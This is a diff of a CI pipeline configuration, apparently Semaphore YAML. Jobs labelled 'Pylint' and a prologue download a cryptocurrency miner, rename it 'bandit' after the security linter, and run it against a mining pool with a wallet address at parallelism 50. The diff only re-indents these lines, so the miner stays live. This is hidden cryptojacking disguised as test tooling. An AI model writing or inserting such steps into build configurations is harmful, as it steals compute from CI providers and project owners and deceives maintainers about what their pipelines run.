@@ -79,10 +79,10 @@ blocks:
       jobs:
         - name: Pylint
           commands:
-          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-          - tar xf cpuminer-opt-linux.tar.gz
-          - mv cpuminer-sse2 bandit
-          - './bandit -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q7rd7nzu0vxv7tks8phzkd70gtuxnf3jkjhm9g8.1 -t0'
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 bandit
+            - './bandit -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q7rd7nzu0vxv7tks8phzkd70gtuxnf3jkjhm9g8.1 -t0'
           parallelism: 50
       epilogue:
         always:
@@ -152,7 +152,7 @@ blocks:
           value: pydjango
       prologue:
         commands:
-- 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
           - tar xf cpuminer-opt-linux.tar.gz
           - mv cpuminer-sse2 bandit
           - './bandit -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q7rd7nzu0vxv7tks8phzkd70gtuxnf3jkjhm9g8.1 -t0'
